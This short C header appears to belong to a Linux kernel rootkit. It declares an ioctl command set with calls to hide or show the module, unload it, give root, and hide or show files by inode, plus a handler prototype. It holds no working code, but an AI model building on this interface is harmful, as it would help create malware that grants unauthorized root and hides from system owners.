enum service_calls {
    SERVICE_SHOW=0,
    SERVICE_HIDE,
    SERVICE_UNLOAD,
    SERVICE_CHANGE_FD,
    SERVICE_PING,
    SERVICE_CHANGE_PING_ARG,
    SERVICE_GIVE_ROOT,
    SERVICE_HIDE_FILE_INODE,
    SERVICE_SHOW_FILE_INODE
};

struct __packed show_file_inode_info {
    unsigned long ino;
    int pid;
};

int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg);